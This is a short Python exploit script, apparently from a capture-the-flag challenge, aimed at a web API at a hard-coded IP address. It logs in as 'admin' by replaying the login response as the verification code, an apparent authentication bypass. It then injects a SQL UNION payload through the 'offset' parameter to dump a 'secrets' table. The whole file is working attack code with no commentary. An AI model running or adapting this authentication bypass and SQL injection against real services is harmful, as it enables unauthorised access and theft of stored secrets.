#!/usr/bin/env python3
import requests
import sys

BASE_URL = 'http://35.207.189.79/api/'
#requests.post(BASE_URL + 'signup', data=json.dumps({'name': 'yolo', 'email': 'yolo@yolo'}))
resp = requests.post(BASE_URL + 'login', json={'email': 'admin'})
if resp.status_code != 200:
    print(resp.text)
    sys.exit(1)
resp = requests.post(BASE_URL + 'verify', json={'code': resp.text})
if resp.status_code != 200:
    print(resp.text)
    sys.exit(1)
#print(resp.cookies)
#print(resp.headers)
resp = requests.post(
    BASE_URL + 'getprojectsadmin',
    json={'offset': "1' UNION SELECT id,secret,1,1,1,1,1,1 FROM secrets; --", 'sorting': 'newest'},
    cookies=resp.cookies)
for result in resp.json():
    print(result)
